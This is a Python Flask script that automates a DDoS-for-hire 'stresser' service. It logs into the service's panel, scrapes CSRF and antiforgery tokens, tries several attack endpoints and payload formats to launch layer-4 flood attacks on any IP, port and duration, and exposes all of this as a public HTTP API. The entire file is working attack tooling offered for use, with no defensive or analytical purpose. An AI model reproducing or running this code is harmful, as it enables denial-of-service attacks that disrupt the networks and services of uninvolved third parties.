import requests
import time
import re
from flask import Flask, request, jsonify
from bs4 import BeautifulSoup

app = Flask(__name__)

class RetroStresser:
    def __init__(self, username=None, password=None):
        self.session = requests.Session()
        self.base_url = "https://retrostress.net"
        self.username = username
        self.password = password
        
        # Real browser headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        })
    
    def get_fresh_tokens(self):
        """Dynamically fetch fresh antiforgery tokens"""
        try:
            # Step 1: Get login page to capture initial tokens
            print("[*] Fetching login page...")
            login_page = self.session.get(f"{self.base_url}/login")
            
            # Extract antiforgery token from hidden input
            soup = BeautifulSoup(login_page.text, 'html.parser')
            csrf_token = None
            
            # Find __RequestVerificationToken
            csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
            if csrf_input:
                csrf_token = csrf_input.get('value')
                print(f"[✓] CSRF Token found: {csrf_token[:30]}...")
            
            # Extract cookies
            antiforgery_cookie = None
            for cookie in self.session.cookies:
                if '.AspNetCore.Antiforgery' in cookie.name:
                    antiforgery_cookie = cookie.value
                    print(f"[✓] Antiforgery cookie: {antiforgery_cookie[:30]}...")
                    break
            
            return {
                'csrf_token': csrf_token,
                'antiforgery_cookie': antiforgery_cookie
            }
            
        except Exception as e:
            print(f"[!] Error getting tokens: {e}")
            return None
    
    def login(self):
        """Login with credentials to get auth_token"""
        if not self.username or not self.password:
            print("[!] No credentials provided, using existing session")
            return True
        
        tokens = self.get_fresh_tokens()
        if not tokens or not tokens['csrf_token']:
            return False
        
        # Login payload
        login_data = {
            'username': self.username,
            'password': self.password,
            '__RequestVerificationToken': tokens['csrf_token']
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f"{self.base_url}/login",
            'Origin': self.base_url
        }
        
        print("[*] Attempting login...")
        response = self.session.post(
            f"{self.base_url}/login",
            data=login_data,
            headers=headers
        )
        
        # Check if login successful
        if response.status_code == 200 and 'panel' in response.url:
            print("[✓] Login successful!")
            
            # Extract auth_token
            for cookie in self.session.cookies:
                if cookie.name == 'auth_token':
                    print(f"[✓] Auth token obtained: {cookie.value[:30]}...")
                    return True
        
        print("[✗] Login failed!")
        return False
    
    def send_attack(self, ip, port, duration):
        """Send attack with fresh tokens"""
        try:
            # Refresh tokens before each attack
            tokens = self.get_fresh_tokens()
            
            # First visit panel page to establish session
            panel_resp = self.session.get(f"{self.base_url}/panel")
            
            # Try multiple attack endpoints
            attack_endpoints = [
                f"{self.base_url}/api/attack/l4",
                f"{self.base_url}/api/attack",
                f"{self.base_url}/Home/StartAttack",
                f"{self.base_url}/attack/start"
            ]
            
            # Payload formats
            payloads = [
                # JSON format
                {'ip': ip, 'port': port, 'time': duration, 'method': 'L4'},
                # Form format
                f'ip={ip}&port={port}&time={duration}&method=L4',
                # Alternative format
                {'target': ip, 'port': port, 'duration': duration, 'type': 'L4'}
            ]
            
            headers_list = [
                {'Content-Type': 'application/json'},
                {'Content-Type': 'application/x-www-form-urlencoded'},
                {'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest'}
            ]
            
            # Try all combinations
            for endpoint in attack_endpoints:
                for payload in payloads:
                    for headers in headers_list:
                        try:
                            if isinstance(payload, dict):
                                response = self.session.post(endpoint, json=payload, headers=headers)
                            else:
                                response = self.session.post(endpoint, data=payload, headers=headers)
                            
                            if response.status_code == 200:
                                print(f"[✓] Attack sent via {endpoint}")
                                return True
                            elif response.status_code == 400:
                                # Bad request, try next format
                                continue
                        except:
                            continue
            
            # If all fail, try GET with panel session
            attack_url = f"{self.base_url}/panel?attack=true&ip={ip}&port={port}&time={duration}"
            response = self.session.get(attack_url)
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"[!] Attack error: {e}")
            return False
    
    def execute_attack(self, ip, port, total_time):
        """Main attack execution with time splitting"""
        if total_time < 30:
            total_time = 30
        
        # Time splitting logic
        attacks = []
        remaining = total_time
        while remaining > 0:
            if remaining >= 60:
                attacks.append(60)
                remaining -= 60
            else:
                if remaining >= 30:
                    attacks.append(remaining)
                elif attacks:
                    attacks[-1] += remaining
                else:
                    attacks.append(remaining)
                break
        
        results = []
        for i, duration in enumerate(attacks, 1):
            print(f"\n[🔥] Attack {i}/{len(attacks)} - {duration}s")
            success = self.send_attack(ip, port, duration)
            results.append({
                'attack': i,
                'duration': duration,
                'success': success
            })
            
            if success and i < len(attacks):
                print(f"[⏰] Waiting {duration}s...")
                time.sleep(duration)
        
        return {
            'target': f"{ip}:{port}",
            'total_time': total_time,
            'attacks': attacks,
            'results': results
        }

# Flask API
stresser = RetroStresser(
    username=None,  # Agar login required hai toh yahan daalo
    password=None   # Agar login required hai toh yahan daalo
)

@app.route('/api')
@app.route('/api/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_sec = request.args.get('time')
    
    if not ip or not port or not time_sec:
        return jsonify({'error': 'Use: ?ip=IP&port=PORT&time=TIME'}), 400
    
    try:
        port = int(port)
        time_sec = int(time_sec)
        
        print(f"\n{'='*50}")
        print(f"[🎯] Target: {ip}:{port}")
        print(f"[⏱️] Time: {time_sec}s")
        print(f"{'='*50}")
        
        # Execute attack
        result = stresser.execute_attack(ip, port, time_sec)
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/login')
def login_endpoint():
    """Login endpoint to get fresh session"""
    username = request.args.get('username')
    password = request.args.get('password')
    
    if username and password:
        stresser.username = username
        stresser.password = password
        success = stresser.login()
        return jsonify({'login_success': success})
    
    return jsonify({'error': 'Provide username and password'}), 400

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'Dynamic RetroStresser API',
        'endpoints': {
            'attack': '/api?ip=IP&port=PORT&time=TIME',
            'login': '/login?username=USER&password=PASS'
        }
    })

if __name__ == '__main__':
    print("[+] Starting Dynamic RetroStresser API...")
    print("[+] Tokens will be fetched dynamically")
    app.run(host='0.0.0.0', port=8080)
